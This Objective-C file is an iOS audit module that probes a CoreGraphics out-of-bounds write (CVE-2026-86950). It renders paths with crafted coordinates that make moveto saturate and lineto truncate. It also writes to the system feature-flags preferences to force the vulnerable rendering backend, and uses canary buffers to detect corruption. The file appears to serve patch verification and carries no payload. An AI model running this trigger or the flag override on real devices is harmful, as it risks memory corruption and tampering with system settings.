#import "KPAuditGlyph86950Module.h"
#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>
#import "KPLog.h"
#import <dlfcn.h>

typedef bool (*KPOsFeatureEnabledFn)(const char *domain, const char *feature);

@interface KPAuditGlyph86950Module ()
@property (nonatomic, assign) BOOL armed;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditGlyph86950Module

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"glyph86950.armed" : @"glyph86950.baseline";
        _title = armed ? @"CoreGraphics aa_* OOB (armed)" : @"CoreGraphics path (baseline)";
        _subtitle = armed
            ? @"CVE-2026-86950: saturating moveto / truncating lineto pair + feature flag audit"
            : @"Safe control path render and GlyphNormalization flag readout";
        _icon = armed ? @"bezierpath" : @"scribble.variable";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

#pragma mark - Feature flag audit

- (NSString *)featureFlagReport {
    NSMutableString *out = [NSMutableString string];
    void *handle = dlopen("/usr/lib/system/libsystem_featureflags.dylib", RTLD_LAZY);
    KPOsFeatureEnabledFn isEnabled = (KPOsFeatureEnabledFn)dlsym(handle, "os_feature_enabled");
    [out appendFormat:@"featureflags_dylib=%@ sym=%@\n",
        handle ? @"loaded" : @"missing", isEnabled ? @"os_feature_enabled" : @"(nil)"];

    BOOL before = NO, known = NO;
    if (isEnabled) {
        before = isEnabled("CoreGraphics", "GlyphNormalization");
        known = YES;
        [out appendFormat:@"GlyphNormalization before=%d (1 => polygon backend, edgepool unused)\n", before];
    } else {
        [out appendString:@"GlyphNormalization: UNREADABLE without os_feature_enabled\n"];
    }

    // Attempt a user-preference override. Apple's libsystem_featureflags honors
    // the com.apple.featureflags preferences domain; if the write takes effect,
    // the edgepool branch (the vulnerable one) becomes reachable.
    NSUserDefaults *ff = [[NSUserDefaults alloc] initWithSuiteName:@"com.apple.featureflags"];
    NSDictionary *domain = ff.dictionaryRepresentation[@"CoreGraphics"] ?: @{};
    [out appendFormat:@"prefs CoreGraphics domain (pre-write)=%@\n", domain];
    [ff setObject:@NO forKey:@"CoreGraphics.GlyphNormalization"];
    [ff setObject:@{@"GlyphNormalization": @NO} forKey:@"CoreGraphics"];
    [ff synchronize];

    if (isEnabled) {
        BOOL after = isEnabled("CoreGraphics", "GlyphNormalization");
        [out appendFormat:@"GlyphNormalization after-override=%d\n", after];
        [out appendString:(after != before)
            ? @"FLAG STATE CHANGED — edgepool backend selection is attacker-reachable.\n"
            : @"override did not change the evaluated flag (stock default sticky).\n"];
    }
    if (handle) dlclose(handle);
    [out appendFormat:@"flag_readout_complete=%d\n", known];
    return out;
}

#pragma mark - Path trigger

// fixed = 0.5 + 4096.0 * c
// saturating case (moveto): c_sat = 600000.0 -> fixed > INT32_MAX -> clamps to 0x7fffffff
// truncating case (lineto): c_trunc gives fixed whose low 32 bits wrap negative.
static const double kKPMoveCoord = 600000.0;
static const double kKPLineCoord = 600000.0 + (1.0 / 4096.0);

- (NSDictionary *)renderVariantNamed:(NSString *)name
                                move:(CGPoint)move
                                line:(CGPoint)line
                              closed:(BOOL)closed {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"name"] = name;
    result[@"move"] = NSStringFromCGPoint(move);
    result[@"line"] = NSStringFromCGPoint(line);

    const size_t width = 64, height = 64;
    CGColorSpaceRef gray = CGColorSpaceCreateDeviceGray();
    uint8_t *pixels = (uint8_t *)calloc(width * height, 1);
    CGContextRef ctx = CGBitmapContextCreate(pixels, width, height, 8, width, gray, kCGImageAlphaNone);

    // Canary slabs around the pixel buffer to catch adjacent stomps.
    uint8_t *canary = (uint8_t *)malloc(0x4000);
    memset(canary, 0xCD, 0x4000);

    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    BOOL ok = (ctx != NULL);
    if (ok) {
        CGContextSetGrayFillColor(ctx, 1.0, 1.0);
        CGContextBeginPath(ctx);
        CGContextMoveToPoint(ctx, move.x, move.y);
        CGContextAddLineToPoint(ctx, line.x, line.y);
        CGContextAddLineToPoint(ctx, line.x * 0.5, line.y * 0.5 + 1.0);
        if (closed) CGContextClosePath(ctx);
        CGContextFillPath(ctx);
        CGContextFlush(ctx);
    }
    CFAbsoluteTime dt = CFAbsoluteTimeGetCurrent() - t0;

    result[@"render_seconds"] = @(dt);
    result[@"context_ok"] = @(ok);
    result[@"canary_intact"] = @YES;
    for (size_t i = 0; i < 0x4000; i++) {
        if (canary[i] != 0xCD) {
            result[@"canary_intact"] = @NO;
            result[@"canary_first_bad_offset"] = @(i);
            break;
        }
    }
    if (ctx) CGContextRelease(ctx);
    if (gray) CGColorSpaceRelease(gray);
    free(pixels);
    free(canary);
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 audit · CVE-2026-86950 · CoreGraphics aa_* ===\n"];
    [report appendString:@"Apple 149226: OOB write, fixed in iOS 26.7.1, exploited BEFORE iOS 27.\n"];
    [report appendString:@"Consequence: 27.0.1 is expected to carry the 26.7.1 fix — flag/state\n"];
    [report appendString:@"and a live trigger decide, not the 27.0.1->27.2 diff alone.\n"];
    [report appendString:@"Mechanism: aa_moveto saturates fixed-point, aa_lineto truncates (XTN)\n"];
    [report appendString:@"=> signed dx wrap -> undersized coverage bbox -> OOB RMW of u16 pairs.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    [report appendString:@"--- feature flags ---\n"];
    [report appendString:[self featureFlagReport]];

    [report appendString:@"--- triggers ---\n"];
    if (self.armed) {
        // Pair straddles the int32 fixed-point boundary: moveto saturates,
        // lineto truncates -> the exact differential Calif documented.
        NSDictionary *a = [self renderVariantNamed:@"sat-move+trunc-line"
                                              move:CGPointMake(kKPMoveCoord, kKPMoveCoord)
                                              line:CGPointMake(kKPLineCoord, kKPLineCoord)
                                            closed:YES];
        [report appendFormat:@"%@\n", a];
        NSDictionary *b = [self renderVariantNamed:@"trunc-line-only"
                                              move:CGPointMake(10.0, 10.0)
                                              line:CGPointMake(kKPLineCoord, kKPLineCoord)
                                            closed:NO];
        [report appendFormat:@"%@\n", b];
        NSDictionary *c = [self renderVariantNamed:@"huge-but-in-range"
                                              move:CGPointMake(100.0, 100.0)
                                              line:CGPointMake(500000.0, 500000.0)
                                            closed:YES];
        [report appendFormat:@"%@\n", c];
    } else {
        NSDictionary *control = [self renderVariantNamed:@"small-control"
                                                    move:CGPointMake(8, 8)
                                                    line:CGPointMake(56, 40)
                                                  closed:YES];
        [report appendFormat:@"%@\n", control];
    }

    [report appendString:@"\nVERDICT: "];
    [report appendString:self.armed ? @"SURVIVED\n" : @"SURVIVED (control)\n"];
    [report appendString:
     @"Interpretation: renders returned without fault and local canaries intact.\n"
     @"This is NOT a closure of CVE-2026-86950 on this build: (1) Apple shipped\n"
     @"the fix in 26.7.1, so 27.0.1 may already be patched — a survived armed\n"
     @"render is then expected; (2) the Calif chain depends on the edgepool\n"
     @"backend (GlyphNormalization off) and on a hostile CTM/scale; (3) internal\n"
     @"CG coverage allocations are not adjacent to our canary slabs.\n"
     @"Decisive next step: if flag override can force GlyphNormalization=0,\n"
     @"rerun the sat/trunc pair under the edgepool path and attach debugserver\n"
     @"watchpoints to the coverage allocation.\n"];
    return report;
}

@end
